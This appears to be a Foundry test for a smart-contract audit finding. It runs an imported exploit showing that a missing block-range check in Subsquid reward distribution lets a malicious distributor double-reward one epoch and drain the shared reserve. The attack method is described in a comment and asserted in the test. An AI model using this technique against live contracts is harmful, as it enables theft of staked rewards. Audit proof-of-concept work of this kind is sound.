// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    DistributedRewardsDistribution,
    RewardToken,
    Router,
    Staking
} from "./58245-h-01-missing-check-on-toblock-allows-distributors-to-change.sol";

// Subsquid H-01 (finding 58245): `commit` is missing a `require(toBlock >= fromBlock)`
// check. A malicious distributor commits a degenerate range [fromBlock=1, toBlock=0];
// `distribute` then sets lastBlockRewarded = toBlock = 0, so the sequential guard stays
// open and the SAME range is rewarded again. Worker entitlement doubles for one epoch
// and the doubled amount is drained from the shared reward reserve.
contract Finding58245Test is Test {
    function test_exploit_missingToBlockCheck_doubleRewardsSameEpoch() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("claimable after two distributions (wei)", e.claimableAfterDouble());
        emit log_named_uint("attacker claimed (wei)", e.claimedByAttacker());
        emit log_named_uint("shared reserve drained (wei)", e.reserveDrained());
        emit log_named_uint("profit (wei)", e.profit());

        // same epoch [1,0] rewarded twice -> worker entitlement doubled to 2000e18
        assertEq(e.claimableAfterDouble(), 2000 ether, "same epoch must be double-rewarded");
        // attacker cashes out the doubled entitlement
        assertEq(e.claimedByAttacker(), 2000 ether, "attacker must claim doubled reward");
        assertEq(e.profit(), 2000 ether, "attacker must receive doubled reward");
        // real, over-budget drain of the shared reserve (1000e18 stolen beyond one payout)
        assertEq(e.reserveDrained(), 2000 ether, "shared reserve must be drained by doubled amount");
    }
}
